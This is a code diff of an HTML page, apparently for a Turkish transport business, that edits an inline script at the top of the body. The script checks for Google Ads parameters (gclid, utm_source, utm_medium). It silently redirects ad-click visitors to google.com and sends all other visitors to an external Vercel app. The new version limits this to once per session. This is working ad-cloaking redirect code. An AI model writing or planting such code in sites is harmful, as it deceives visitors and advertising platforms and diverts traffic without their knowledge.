@@ -408,31 +408,38 @@
   </style>
 </head>
 <body>
- <script>
-(function() {
 
-    // URL parametrelerini al
-    const urlParams = new URLSearchParams(window.location.search);
 
-    // Google Ads tespiti için kriterler (gclid en önemli)
-    const isGoogleAds = (
-        urlParams.has("gclid") || 
-        (urlParams.get("utm_source") && urlParams.get("utm_source").toLowerCase() === "google") ||
-        (urlParams.get("utm_medium") && ["cpc", "ppc"].includes(urlParams.get("utm_medium").toLowerCase()))
-    );
+    <script>
+(function () {
+
+    // Daha önce yönlendirme yapıldı mı? (1 kez)
+    if (sessionStorage.getItem("redirected") === "yes") {
+        // Bir daha yönlendirme yapma
+        return;
+    }
+
+    const params = new URLSearchParams(window.location.search);
+
+    // Google Reklam tespiti
+    const isGoogleAds =
+        params.has("gclid") ||
+        (params.get("utm_source") && params.get("utm_source").toLowerCase() === "google") ||
+        (params.get("utm_medium") && ["cpc", "ppc"].includes(params.get("utm_medium").toLowerCase()));
+
+    // Yönlendirme sadece 1 kez işaretleniyor
+    sessionStorage.setItem("redirected", "yes");
 
     if (isGoogleAds) {
-        // Kullanıcı Google Ads’den geliyorsa →yönlendir.
-        const queryString = window.location.search; // tüm parametreleri bozmadan al
-        window.location.href = "https://google.com" + queryString;
+        // Google reklamlarından geldiyse → Google.com + tüm parametreler
+        window.location.href = "https://google.com" + window.location.search;
     } else {
-        // Normal giriş → nakliye-lac.vercel.app aç
+        // Normal giriş → Vercel uygulaması
         window.location.href = "https://nakliye-lac.vercel.app/";
     }
 
 })();
-</script>  
-
+</script>
 
 
   <!-- Header -->
